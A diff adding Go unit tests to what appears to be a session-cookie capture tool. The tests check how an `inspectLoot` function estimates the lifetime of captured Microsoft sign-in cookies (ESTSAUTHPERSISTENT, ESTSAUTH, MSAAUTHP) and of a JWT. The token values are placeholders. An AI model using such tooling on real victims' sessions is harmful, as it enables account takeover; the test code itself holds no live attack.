@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"strings"
 	"testing"
 )
@@ -126,6 +127,54 @@ func TestIsJunkCookieValue(t *testing.T) {
 	}
 	if isJunkCookieValue("0.AX-real-token") {
 		t.Error("real token flagged as junk")
+	}
+}
+
+func TestCookieTTL_EntraPersistent(t *testing.T) {
+	captured := int64(1_700_000_000)
+	s := sess(map[string]map[string]*CookieToken{
+		"login.microsoftonline.com": {"ESTSAUTHPERSISTENT": tok("1.AX0AMe_N-B6jSkuT5F-long")},
+	}, "")
+	s.UpdateTime = captured
+	got := s.inspectLoot()
+	if got.TTLKind != "typical" || got.Expires != captured+90*24*3600 {
+		t.Fatalf("entra persistent ttl: %+v", got)
+	}
+}
+
+func TestCookieTTL_MSAUTHP(t *testing.T) {
+	captured := int64(1_700_000_000)
+	s := sess(map[string]map[string]*CookieToken{
+		"login.live.com": {"__Host-MSAAUTHP": tok("11-M.C543_BL2.0.U.Ms-long")},
+	}, "")
+	s.UpdateTime = captured
+	got := s.inspectLoot()
+	if got.TTLKind != "typical" || got.Expires != captured+365*24*3600 {
+		t.Fatalf("msa persistent ttl: %+v", got)
+	}
+}
+
+func TestCookieTTL_Session(t *testing.T) {
+	s := sess(map[string]map[string]*CookieToken{
+		"login.microsoftonline.com": {"ESTSAUTH": tok("1.AX0AMe_N-B6jSkuT5F-long")},
+	}, "")
+	s.UpdateTime = 1_700_000_000
+	got := s.inspectLoot()
+	if got.TTLKind != "session" || got.Expires != 0 {
+		t.Fatalf("estsauth should be a browser session: %+v", got)
+	}
+}
+
+func TestCookieTTL_JWT(t *testing.T) {
+	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
+	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"exp":1800000000}`))
+	s := sess(map[string]map[string]*CookieToken{
+		"example.com": {"ESTSAUTHPERSISTENT": tok(header + "." + payload + ".sig")},
+	}, "")
+	s.UpdateTime = 1_700_000_000
+	got := s.inspectLoot()
+	if got.TTLKind != "parsed" || got.Expires != 1800000000 {
+		t.Fatalf("jwt exp: %+v", got)
 	}
 }
 
